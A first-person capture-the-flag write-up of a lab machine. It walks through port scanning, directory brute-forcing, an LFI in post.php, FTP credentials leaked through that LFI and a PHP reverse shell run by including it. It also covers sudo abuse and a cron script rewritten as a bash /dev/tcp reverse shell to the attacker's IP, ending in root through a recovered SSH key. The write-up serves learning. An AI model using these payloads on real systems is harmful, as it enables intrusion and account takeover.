Port scanning
```bash
nmap -p- --min-rate=5000 10.10.107.186
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 17:29 EEST
Nmap scan report for 10.10.107.186
Host is up (0.24s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.85 seconds
                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# nmap -p 21,22,80 -sC -sV 10.10.107.186
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 17:29 EEST
Nmap scan report for 10.10.107.186
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:db:ed:22:3d:9f:e7:82:fb:6a:8e:bb:6f:df:39:47 (RSA)
|   256 a8:7b:0f:76:22:b2:68:3c:c4:91:a2:81:7e:af:52:e0 (ECDSA)
|_  256 5a:17:99:3e:5e:3f:d9:c6:0b:2e:80:36:64:8f:5e:b2 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Jekyll v4.1.1
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.90 seconds
```
So there is ftp (No anonymous login), ssh and a website running apache.

I searced for hidden directories

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.107.186/ -t 100 -x php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.107.186/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.107.186/css/]
/images               (Status: 301) [Size: 315] [--> http://10.10.107.186/images/]
/index.php            (Status: 200) [Size: 4826]
/post.php             (Status: 200) [Size: 2422]
/robots.txt           (Status: 200) [Size: 69]
/server-status        (Status: 403) [Size: 278]
```

The robots.txt and post.php were interesting. The text file had the following inside.
```bash
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```
Ok so now we got the first flag.

I found LFI vulnerability on the website. 
```bash
http://10.10.107.186/post.php?post=../../../../etc/passwd
```


I bruteforced the LFI to see what kind of things we could find

```bash
ffuf -w LFI-gracefulsecurity-linux.txt -u http://10.10.107.186/post.php?post=FUZZ -fs 2422
```

I didn't find anything interesting. Atleast we were able to read that previous file and see two users 
```bash
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777
```
I pretty sure we can upload a reverse shell of some sort and then visit that given site to execute it.

```bash
http://10.10.107.186/post.php?post=/home/ftpuser/ftp/files/revshell.php

nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.107.186] 49462
Linux ip-10-10-107-186 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 15:08:29 up 40 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-107-186:/$ 

```
Very nice. 

Got the third flag
```bash
www-data@ip-10-10-107-186:/home/mat$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
<t$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
```

I imported linpeas over

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid       
Matching Defaults entries for www-data on ip-10-10-107-186:                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-107-186:
    (toby) NOPASSWD: ALL
```
We got the 4th flag since we were able to do things as "toby"

```bash
www-data@ip-10-10-107-186:/home/toby$ sudo -u toby cat flag_4.txt
sudo -u toby cat flag_4.txt
FLAG{chad_lifestyle}
```

There is a message talking about cronjobs and there is a bash file in the home folder of toby so it's being ran as mat and we can use it to get a shell of mat

I changed the cow.sh to
```bash
www-data@ip-10-10-107-186:/home/toby/jobs$ cat cow.sh
#!/bin/bash
bash -i >& /dev/tcp/10.6.25.159/4444 0>&1
```
And just waited for smth to happen.

And we got the mat shell.. Great.


```bash
nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.107.186] 52600
bash: cannot set terminal process group (39501): Inappropriate ioctl for device
bash: no job control in this shell
mat@ip-10-10-107-186:~$ 
```


Mat also has a note.txt inside from Will. It says that we have sudo rights to use a python script as Wills user. That's the only thing we can run as sudo so im guessing thats our way to break out of the shell and continue as Will


We were successfull after runningthe script as will


```bash
sudo -u will python3 /home/mat/scripts/will_script.py cmd.py


listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.107.186] 38142
$ whoami
will
$ ls -la
total 20
drwxrwxr-x 3 will will 4096 Aug 31 16:06 .
drwxr-xr-x 6 mat  mat  4096 Aug 31 16:06 ..
-rw-r--r-- 1 mat  mat   381 Aug 31 16:06 cmd.py
drwxrwxr-x 2 will will 4096 Aug 31 16:06 __pycache__
-rw-r--r-- 1 will will  208 Dec  3  2020 will_script.py
$ 
```

There is a  key.b64 inside and its for root and group adm in which the user will is. 

It was decodede base64 text and after decrypting it it was a rsa private key which i was able to use to log into ssh and get a root account and get the last flag.


Nice. thats was all. That machine was great and i actually feel like i learnt new stuff in it. I could have even done some more flags. Great.
